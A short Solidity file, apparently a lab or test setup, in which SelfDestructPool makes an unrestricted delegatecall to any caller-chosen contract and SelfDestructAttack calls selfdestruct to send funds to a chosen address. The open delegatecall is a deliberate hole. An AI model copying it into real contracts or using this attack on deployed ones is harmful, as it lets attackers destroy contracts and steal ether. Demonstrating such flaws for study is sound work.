pragma solidity ^0.8.0;

import "forge-std/console.sol";

contract SelfDestructPool {
    constructor() payable {}

    function lend(address payable _contract, string memory data, address payable bob) public {
        (bool success, bytes memory data) = _contract.delegatecall(abi.encodeWithSignature(data, bob));
    }
}

contract SelfDestructAttack {
    constructor() payable {}

    function destroy(address sendTo) public {
        selfdestruct(payable(sendTo));
    }
}
